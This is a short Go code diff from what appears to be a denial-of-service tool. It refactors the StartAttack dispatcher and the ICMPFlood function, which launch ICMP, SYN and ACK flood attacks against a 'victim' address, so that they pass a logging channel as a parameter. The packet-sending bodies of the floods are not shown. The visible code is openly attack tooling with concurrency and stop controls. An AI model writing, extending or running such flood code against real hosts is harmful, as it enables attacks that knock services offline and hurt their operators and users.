@@ -11,18 +11,18 @@ import (
 	"time"
 )
 
-func StartAttack(victim string, ddosType string, stopchan chan bool) {
+func StartAttack(victim string, ddosType string, stopchan chan bool, logChan chan string) {
 	if ddosType == "ICMP" {
 		//ip without port
 		ip := strings.Split(victim, ":")[0]
-		go ICMPFlood(ip, stopchan)
+		go ICMPFlood(ip, stopchan, logChan)
 	} else if ddosType == "SYN" {
 		go SYNFlood(victim, stopchan)
 	} else if ddosType == "ACK" {
 		go ACKFlood(victim)
 	}
 }
-func ICMPFlood(victim string, stopChan chan bool) {
+func ICMPFlood(victim string, stopChan chan bool, logChan chan string) {
 	var maxChannelsNb = 20
 	var channels = make(chan struct{}, maxChannelsNb)
 
@@ -41,7 +41,7 @@ func ICMPFlood(victim string, stopChan chan bool) {
 		select {
 		case isStop := <-stopChan:
 			if isStop {
-				LogChan <- "Stopping attack"
+				logChan <- "Stopping attack"
 				stopChan <- false
 				return
 			}
